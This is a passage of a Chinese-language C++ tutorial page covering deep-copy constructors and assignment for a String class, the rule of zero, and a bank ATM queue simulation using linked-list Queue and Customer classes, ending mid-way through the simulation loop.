 <span class="keyword">int</span> len;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    String(<span class="keyword">const</span> <span class="keyword">char</span> * s); <span class="comment">// Constructor using new</span></span><br><span class="line">    String(<span class="keyword">const</span> String &amp; st); <span class="comment">// Copy constructor (deep copy)</span></span><br><span class="line">    ~String(); <span class="comment">// Destructor using delete[]</span></span><br><span class="line">    String &amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> String &amp; st); <span class="comment">// Assignment operator (deep copy)</span></span><br><span class="line">    String &amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> <span class="keyword">char</span> * s);   <span class="comment">// Another assignment overload</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// string1.cpp excerpt (实现深复制)</span></span><br><span class="line">String::String(<span class="keyword">const</span> String &amp; st) &#123; <span class="comment">// Copy Constructor</span></span><br><span class="line">    len = st.len;</span><br><span class="line">    str = <span class="keyword">new</span> <span class="keyword">char</span> [len + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(str, st.str);</span><br><span class="line">    <span class="comment">// ... (update static count etc.)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String::~String() &#123; <span class="comment">// Destructor</span></span><br><span class="line">    <span class="keyword">delete</span> [] str;</span><br><span class="line">    <span class="comment">// ... (update static count etc.)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String &amp; String::<span class="keyword">operator</span>=(<span class="keyword">const</span> String &amp; st) &#123; <span class="comment">// Assignment Operator</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;st)</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">delete</span> [] str; <span class="comment">// Free old string</span></span><br><span class="line">    len = st.len;</span><br><span class="line">    str = <span class="keyword">new</span> <span class="keyword">char</span> [len + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(str, st.str);</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>现代 C++ (零法则):</strong><br>如果可能，尽量避免手动管理原始指针和 <code>new</code>/<code>delete</code>。使用标准库提供的容器（如 <code>std::string</code>, <code>std::vector</code>）和智能指针（如 <code>std::unique_ptr</code>, <code>std::shared_ptr</code>）。这些类已经内置了正确的资源管理和复制/移动语义，遵循 RAII 原则。如果你的类只包含这类成员，通常就不需要编写自定义的析构函数、复制/移动构造函数或赋值运算符，编译器生成的默认版本就能正确工作（零法则）。</p><p>掌握这些技术对于编写安全、健壮且能正确处理动态内存的 C++ 类至关重要。</p><h2 id="12-7-队列模拟"><a href="#12-7-队列模拟" class="headerlink" title="12.7 队列模拟"></a>12.7 队列模拟</h2><p>本章我们学习了类和动态内存分配，现在我们将这些知识应用于一个实际问题：模拟银行 ATM 的客户队列。通过模拟，我们可以分析不同条件下（如不同的客户到达率、不同的队列最大长度）客户的平均等待时间，帮助银行做出决策。</p><p><strong>模拟场景:</strong></p><ul><li>  有一个 ATM 机。</li><li>  客户随机到达，平均每小时到达一定数量的客户。</li><li>  客户到达后，如果 ATM 空闲且队列为空，则直接使用 ATM。</li><li>  如果 ATM 繁忙或队列非空，客户进入队列等待。</li><li>  队列有最大长度限制，如果客户到达时队列已满，则客户离开（被拒绝服务）。</li><li>  每个客户的交易时间是随机的（在某个范围内）。</li><li>  我们想模拟一段时间（例如 100 小时），然后统计：服务的总客户数、被拒绝的总客户数、平均队列长度、平均客户等待时间。</li></ul><p><strong>实现思路:</strong></p><p>为了实现这个模拟，我们需要两个主要的类：</p><ol><li><strong><code>Customer</code> 类:</strong> 用于表示一个客户。它需要存储客户的关键信息：<ul><li>  <strong>到达时间 (Arrival Time):</strong> 客户何时加入队列。</li><li>  <strong>交易所需时间 (Processing Time):</strong> 客户在 ATM 上需要花费多长时间。</li></ul></li><li><strong><code>Queue</code> 类:</strong> 用于表示等待队列。这是一个典型的<strong>先进先出 (FIFO - First-In, First-Out)</strong> 数据结构。我们需要能够：<ul><li>  将客户添加到队尾 (<code>enqueue</code>)。</li><li>  从队首移除客户 (<code>dequeue</code>)。</li><li>  检查队列是否为空 (<code>is_empty</code>)。</li><li>  检查队列是否已满 (<code>is_full</code>)。</li><li>  获取当前队列中的客户数量 (<code>queue_count</code>)。</li></ul></li></ol><p>由于队列的长度可能在运行时变化（客户加入和离开），并且我们可能需要处理潜在的大量客户，使用<strong>动态内存分配</strong>来实现 <code>Queue</code> 类是合适的。我们将使用**链式队列 (Linked Queue)**，其中每个节点包含一个 <code>Customer</code> 对象和一个指向下一个节点的指针。</p><h3 id="12-7-1-队列类-Queue-Class"><a href="#12-7-1-队列类-Queue-Class" class="headerlink" title="12.7.1 队列类 (Queue Class)"></a>12.7.1 队列类 (Queue Class)</h3><p><strong>设计要点:</strong></p><ul><li>  <strong>节点结构 (Node):</strong> 在 <code>Queue</code> 类内部定义一个私有的 <code>Node</code> 结构（或类），包含一个 <code>Customer</code> 对象（项目）和一个指向下一个 <code>Node</code> 的指针。</li><li><strong>数据成员:</strong><ul><li>  <code>front</code>: 指向队首节点的指针。</li><li>  <code>rear</code>: 指向队尾节点的指针。</li><li>  <code>items</code>: 当前队列中的项目数（客户数）。</li><li>  <code>qsize</code>: 队列的最大容量（构造时指定）。</li></ul></li><li><strong>特殊成员函数 (处理动态内存):</strong><ul><li>  <strong>构造函数:</strong> 初始化队列为空，设置最大容量。</li><li>  <strong>析构函数:</strong> 释放所有节点占用的内存，防止内存泄漏。</li><li>  <strong>复制构造函数:</strong> 实现深复制，创建一个完全独立的队列副本（如果需要复制队列）。</li><li>  <strong>赋值运算符:</strong> 实现深复制赋值，处理自我赋值和内存管理。</li><li>  <em>(注意：对于这个模拟，我们可能不需要复制或赋值队列，可以考虑禁用它们或使用默认行为，但完整的类设计应考虑这些)</em></li></ul></li><li><strong>公有成员函数 (队列操作):</strong><ul><li>  <code>bool isempty() const;</code></li><li>  <code>bool isfull() const;</code></li><li>  <code>int queuecount() const;</code></li><li>  <code>bool enqueue(const Customer &amp;item);</code> // 添加客户到队尾</li><li>  <code>bool dequeue(Customer &amp;item);</code>      // 从队首移除客户，并通过引用参数返回</li></ul></li></ul><p><strong>queue.h (Queue 类定义)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> QUEUE_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUEUE_H_</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 前向声明 Customer 类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Customer</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 为了简化，我们直接使用 Customer 类型，而不是模板</span></span><br><span class="line"><span class="keyword">typedef</span> Customer Item;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Queue</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 内部节点结构</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">        Item item;      <span class="comment">// 存储的数据 (Customer 对象)</span></span><br><span class="line">        Node * next;    <span class="comment">// 指向下一个节点的指针</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> Q_SIZE = <span class="number">10</span> &#125;; <span class="comment">// 默认队列大小 (可以修改)</span></span><br><span class="line"></span><br><span class="line">    Node * front;       <span class="comment">// 指向队首的指针</span></span><br><span class="line">    Node * rear;        <span class="comment">// 指向队尾的指针</span></span><br><span class="line">    <span class="keyword">int</span> items;          <span class="comment">// 当前队列中的项目数</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> qsize;    <span class="comment">// 队列最大容量 (const 成员)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 复制构造函数和赋值运算符设为私有，以禁止复制 (简单处理方式)</span></span><br><span class="line">    <span class="comment">// 如果需要复制，则需要实现深复制</span></span><br><span class="line">    Queue(<span class="keyword">const</span> Queue &amp; q) : qsize(<span class="number">0</span>) &#123; &#125;</span><br><span class="line">    Queue &amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> Queue &amp; q) &#123; <span class="keyword">return</span> *<span class="keyword">this</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数，可以指定最大容量</span></span><br><span class="line">    Queue(<span class="keyword">int</span> qs = Q_SIZE);</span><br><span class="line">    <span class="comment">// 析构函数</span></span><br><span class="line">    ~Queue();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isempty</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> items == <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isfull</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> items == qsize; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">queuecount</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> items; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加项目到队尾</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">enqueue</span><span class="params">(<span class="keyword">const</span> Item &amp;item)</span></span>;</span><br><span class="line">    <span class="comment">// 从队首移除项目</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">dequeue</span><span class="params">(Item &amp;item)</span></span>; <span class="comment">// item 用于接收出队的数据</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// QUEUE_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>queue.cpp (Queue 类实现)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;queue.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt; // for std::rand() - 仅用于 Customer 示例，Queue 本身不需要</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- Customer 类定义 (简单版本，放在这里仅为编译 Queue) ---</span></span><br><span class="line"><span class="comment">// 实际应用中应放在单独的 customer.h/cpp</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Customer</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">long</span> arrive;        <span class="comment">// arrival time for customer</span></span><br><span class="line">    <span class="keyword">int</span> processtime;    <span class="comment">// processing time for customer</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Customer() : arrive(<span class="number">0</span>), processtime(<span class="number">0</span>) &#123;&#125; <span class="comment">// default constructor</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">long</span> when)</span> </span>&#123;</span><br><span class="line">        processtime = <span class="built_in">std</span>::rand() % <span class="number">3</span> + <span class="number">1</span>; <span class="comment">// 随机处理时间 1-3 分钟</span></span><br><span class="line">        arrive = when;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">when</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> arrive; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">ptime</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> processtime; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// --- Customer 类定义结束 ---</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Queue 方法实现</span></span><br><span class="line">Queue::Queue(<span class="keyword">int</span> qs) : qsize(qs) &#123; <span class="comment">// 初始化 const 成员 qsize</span></span><br><span class="line">    front = rear = <span class="literal">nullptr</span>; <span class="comment">// 初始化为空队列</span></span><br><span class="line">    items = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Queue::~Queue() &#123;</span><br><span class="line">    Node * temp;</span><br><span class="line">    <span class="keyword">while</span> (front != <span class="literal">nullptr</span>) &#123; <span class="comment">// 循环直到队列为空</span></span><br><span class="line">        temp = front;          <span class="comment">// 保存当前队首节点地址</span></span><br><span class="line">        front = front-&gt;next;   <span class="comment">// 移动 front 指向下一个节点</span></span><br><span class="line">        <span class="keyword">delete</span> temp;           <span class="comment">// 删除旧的队首节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加项目到队尾</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Queue::enqueue</span><span class="params">(<span class="keyword">const</span> Item &amp;item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (isfull())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 队列已满，无法添加</span></span><br><span class="line"></span><br><span class="line">    Node * add = <span class="keyword">new</span> Node; <span class="comment">// 创建新节点</span></span><br><span class="line">    <span class="comment">// 如果 new 失败，会抛出异常 (这里简化处理，未捕获)</span></span><br><span class="line">    add-&gt;item = item;      <span class="comment">// 设置节点数据</span></span><br><span class="line">    add-&gt;next = <span class="literal">nullptr</span>;   <span class="comment">// 新节点是队尾，next 为空</span></span><br><span class="line">    items++;               <span class="comment">// 项目数增加</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (front == <span class="literal">nullptr</span>)  <span class="comment">// 如果队列原本为空</span></span><br><span class="line">        front = add;       <span class="comment">// 新节点同时是队首和队尾</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        rear-&gt;next = add;  <span class="comment">// 将原队尾节点的 next 指向新节点</span></span><br><span class="line">    rear = add;            <span class="comment">// 更新 rear 指向新的队尾节点</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从队首移除项目</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Queue::dequeue</span><span class="params">(Item &amp;item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (isempty())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 队列为空，无法移除</span></span><br><span class="line"></span><br><span class="line">    item = front-&gt;item;    <span class="comment">// 获取队首节点的数据 (通过引用参数返回)</span></span><br><span class="line">    items--;               <span class="comment">// 项目数减少</span></span><br><span class="line">    Node * temp = front;   <span class="comment">// 保存队首节点地址</span></span><br><span class="line">    front = front-&gt;next;   <span class="comment">// 移动 front 指向下一个节点</span></span><br><span class="line">    <span class="keyword">delete</span> temp;           <span class="comment">// 删除旧的队首节点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (items == <span class="number">0</span>)        <span class="comment">// 如果删除后队列为空</span></span><br><span class="line">        rear = <span class="literal">nullptr</span>;    <span class="comment">// rear 也设为空</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-7-2-Customer-类"><a href="#12-7-2-Customer-类" class="headerlink" title="12.7.2 Customer 类"></a>12.7.2 Customer 类</h3><p>这个类相对简单，只需要存储客户的到达时间和所需的交易时间。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// customer.h (理想情况下)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CUSTOMER_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CUSTOMER_H_</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Customer</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">long</span> arrive;        <span class="comment">// arrival time for customer</span></span><br><span class="line">    <span class="keyword">int</span> processtime;    <span class="comment">// processing time for customer</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Customer() : arrive(<span class="number">0</span>), processtime(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">long</span> when)</span></span>; <span class="comment">// 设置到达时间，并随机生成处理时间</span></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">when</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> arrive; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">ptime</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> processtime; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// CUSTOMER_H_</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// customer.cpp (理想情况下)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;customer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt; // for std::rand()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Customer::set</span><span class="params">(<span class="keyword">long</span> when)</span> </span>&#123;</span><br><span class="line">    processtime = <span class="built_in">std</span>::rand() % <span class="number">3</span> + <span class="number">1</span>; <span class="comment">// 假设处理时间为 1, 2, 或 3 分钟</span></span><br><span class="line">    arrive = when;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>(在上面的 <code>queue.cpp</code> 中，我们为了方便编译，将 <code>Customer</code> 的简单定义直接放在了那里。在实际项目中，应将其分为 <code>.h</code> 和 <code>.cpp</code> 文件。)</em></p><h3 id="12-7-3-ATM-模拟-atm-cpp"><a href="#12-7-3-ATM-模拟-atm-cpp" class="headerlink" title="12.7.3 ATM 模拟 (atm.cpp)"></a>12.7.3 ATM 模拟 (atm.cpp)</h3><p>现在我们可以编写主程序来执行模拟了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt; // for rand() and srand()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt;   // for time()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;queue.h&quot;</span> <span class="comment">// 包含 Queue 类 (它内部包含了 Customer 的简单定义)</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MIN_PER_HR = <span class="number">60</span>; <span class="comment">// 每小时分钟数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：判断是否有新客户到来</span></span><br><span class="line"><span class="comment">// 参数 x: 平均多少分钟来一位客户</span></span><br><span class="line"><span class="comment">// 返回值: true 如果这一分钟有客户来, false 如果没有</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">newcustomer</span><span class="params">(<span class="keyword">double</span> x)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::ios_base;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置随机数种子</span></span><br><span class="line">    <span class="built_in">std</span>::srand(<span class="built_in">std</span>::time(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Case Study: Bank of Heather Automatic Teller\n&quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter maximum size of queue: &quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> qs; <span class="comment">// 队列最大长度</span></span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; qs;</span><br><span class="line">    <span class="function">Queue <span class="title">line</span><span class="params">(qs)</span></span>; <span class="comment">// 创建队列对象</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the number of simulation hours: &quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> hours; <span class="comment">// 模拟总小时数</span></span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; hours;</span><br><span class="line">    <span class="comment">// 模拟以分钟为单位进行</span></span><br><span class="line">    <span class="keyword">long</span> cyclelimit = MIN_PER_HR * hours; <span class="comment">// 总模拟分钟数</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the average number of customers per hour: &quot;</span>;</span><br><span class="line">    <span class="keyword">double</span> perhour; <span class="comment">// 平均每小时客户数</span></span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; perhour;</span><br><span class="line">    <span class="keyword">double</span> min_per_cust; <span class="comment">// 平均多少分钟来一位客户</span></span><br><span class="line">    min_per_cust = MIN_PER_HR / perhour;</span><br><span class="line"></span><br><span class="line">    Item temp;          <span class="comment">// 用于存储新客户</span></span><br><span class="line">    <span class="keyword">long</span> turnaways = <span class="number">0</span>; <span class="comment">// 因队列满而被拒绝的客户数</span></span><br><span class="line">    <span class="keyword">long</span> customers = <span class="number">0</span>; <span class="comment">// 加入队列的总客户数</span></span><br><span class="line">    <span class="keyword">long</span> served = <span class="number">0</span>;    <span class="comment">// 完成服务的总客户数</span></span><br><span class="line">    <span class="keyword">long</span> sum_line = <span class="number">0</span>;  <span class="comment">// 累计的队列长度 (用于计算平均长度)</span></span><br><span class="line">    <span class="keyword">int</span> wait_time = <span class="number">0</span>;  <span class="comment">// 当前客户在 ATM 处还需等待的时间</span></span><br><span class="line">    <span class="keyword">long</span> line_wait = <span class="number">0</span>; <span class="comment">// 所有客户累计的总等待时间 (队列中 + ATM处)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 模拟主循环 ---</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">long</span> cycle = <span class="number">0</span>; cycle &lt; cyclelimit; cycle++) &#123;</span><br><span class="line">        <span class="comment">// 1. 是否有新客户到来？</span></span><br><span class="line">        <span class="keyword">if</span> (newcustomer(min_per_cust)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (line.isfull()) &#123;</span><br><span class="line">                turnaways++; <span class="comment">// 队列满，拒绝</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                customers++; <span class="comment">// 客户加入</span></span><br><span class="line">                temp.<span class="built_in">set</span>(cycle); <span class="comment">// 设置客户到达时间 (当前分钟数) 和随机处理时间</span></span><br><span class="line">                line.enqueue(temp); <span class="comment">// 加入队列</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. ATM 是否空闲？如果空闲且队列有人，则服务下一位</span></span><br><span class="line">        <span class="keyword">if</span> (wait_time &lt;= <span class="number">0</span> &amp;&amp; !line.isempty()) &#123;</span><br><span class="line">            line.dequeue(temp); <span class="comment">// 从队列取出客户</span></span><br><span class="line">            wait_time = temp.ptime(); <span class="comment">// 设置 ATM 需等待时间 = 客户处理时间</span></span><br><span class="line">            line_wait += cycle - temp.when(); <span class="comment">// 累加客户等待时间 (当前时间 - 到达时间)</span></span><br><span class="line">            served++; <span class="comment">// 服务客户数增加</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 如果 ATM 正在服务，则减少剩余等待时间</span></span><br><span class="line">        <span class="keyword">if</span> 